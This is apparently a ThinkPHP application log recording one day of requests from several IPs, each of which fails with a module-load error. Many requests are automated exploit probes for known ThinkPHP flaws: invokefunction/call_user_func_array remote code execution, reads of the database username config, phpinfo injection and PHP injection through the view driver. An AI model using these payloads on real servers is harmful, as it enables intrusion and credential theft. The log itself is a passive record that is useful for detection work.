[ 2024-03-05T00:38:27+08:00 ] 103.17.149.37 /?s=/manage
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000521s ]
ERR: 无法加载模块:Manage

[ 2024-03-05T00:38:28+08:00 ] 103.17.149.37 /?s=/api
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
INFO: [ app_init ] --END-- [ RunTime:0.000189s ]
ERR: 无法加载模块:Api

[ 2024-03-05T02:11:50+08:00 ] 185.216.231.106 /index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=((md5(2333))
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
INFO: [ app_init ] --END-- [ RunTime:0.000673s ]
ERR: 无法加载模块:Index

[ 2024-03-05T02:19:19+08:00 ] 185.216.231.106 /?s=index/thinkconfig/get&name=database.username
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000027s ]
INFO: [ app_init ] --END-- [ RunTime:0.000526s ]
ERR: 无法加载模块:Index

[ 2024-03-05T04:22:52+08:00 ] 103.17.149.37 /?s=index/thinkconfig/get&name=database.username
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000537s ]
ERR: 无法加载模块:Index

[ 2024-03-05T07:02:32+08:00 ] 185.225.234.16 /?s=index/think/module/action/param1/$%7B@phpinfo()
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: [ app_init ] --END-- [ RunTime:0.000637s ]
ERR: 无法加载模块:Index

[ 2024-03-05T09:03:15+08:00 ] 84.17.37.230 /?s=/manage
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000506s ]
ERR: 无法加载模块:Manage

[ 2024-03-05T09:03:16+08:00 ] 84.17.37.230 /?s=/api
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000182s ]
ERR: 无法加载模块:Api

[ 2024-03-05T09:06:08+08:00 ] 185.225.234.16 /?s=index/think/module/action/param1/$%7B@phpinfo()
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000236s ]
ERR: 无法加载模块:Index

[ 2024-03-05T10:24:29+08:00 ] 185.225.234.16 /index.php?s=captcha
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000027s ]
INFO: [ app_init ] --END-- [ RunTime:0.000521s ]
ERR: 无法加载模块:Captcha

[ 2024-03-05T11:47:51+08:00 ] 185.225.234.16 /?s=index/think/view/driver/Php/display&content=%3C?php%20echo%20www_admin_com;?%3E
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000654s ]
ERR: 无法加载模块:Index

[ 2024-03-05T13:57:04+08:00 ] 185.225.234.16 /?s=index/think/view/driver/Php/display&content=%3C?php%20echo%20www_admin_com;?%3E
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000586s ]
ERR: 无法加载模块:Index

[ 2024-03-05T22:35:45+08:00 ] 84.17.37.230 /index.php?s=captcha
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000509s ]
ERR: 无法加载模块:Captcha

[ 2024-03-05T23:51:02+08:00 ] 103.17.149.37 /?s=captcha&test=-1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000695s ]
ERR: 无法加载模块:Captcha

[ 2024-03-05T23:51:02+08:00 ] 103.17.149.37 /?s=captcha&test=-1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000184s ]
ERR: 无法加载模块:Captcha

